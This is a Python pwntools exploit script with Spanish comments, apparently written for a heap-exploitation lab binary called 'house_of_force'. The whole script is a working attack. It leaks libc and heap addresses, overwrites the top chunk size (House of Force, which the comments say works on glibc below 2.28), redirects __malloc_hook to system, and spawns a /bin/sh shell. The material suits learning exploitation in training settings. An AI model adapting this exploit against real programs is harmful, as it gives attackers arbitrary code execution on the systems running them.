#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_force")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# ejecuta la opción malloc, envia tamaño y datos
def malloc(size, data):
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")

io = start()

# Leak puts
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# Leak heap.
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil("> ")
io.timeout = 0.1

#Ataque House of Force. Funciona en glibc < 2.28 

#Sobreescribimos el campo size del top_chunk ya que glibc < 2.X no tiene protección de integridad.
#Al poner 0xffff el tamaño del heap desborda la memoria y nos permite incluso escribir en direcciones
#menores al heap
malloc(24, b"Y"*24 + p64(0xffffffffffffffff))

#Calculamos la distancia a __malloc_hook para sobreescribir por system y cambiar el flujo de ejecución.
distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
#log.info(f"distance {distance}")
malloc(distance, "/bin/sh\0")

#Cambiamos la dirección de __malloc_hook a system. En la siguiente llamada a malloc se ejecutará system.
#El parámetro pasado a malloc será también pasado a system.
malloc(24, p64(libc.sym.system))

#La dirección de /bin/sh en el heap. Se situa a 10bytes de heap + 24 del primer chunk = 0x30
#cmd = heap + 0x30
#malloc(cmd, "")

#Alternativa usar la cadena /bin/sh de la libreria de glibc
cmd = next(libc.search(b"/bin/sh"))
malloc(cmd, "")

io.interactive()
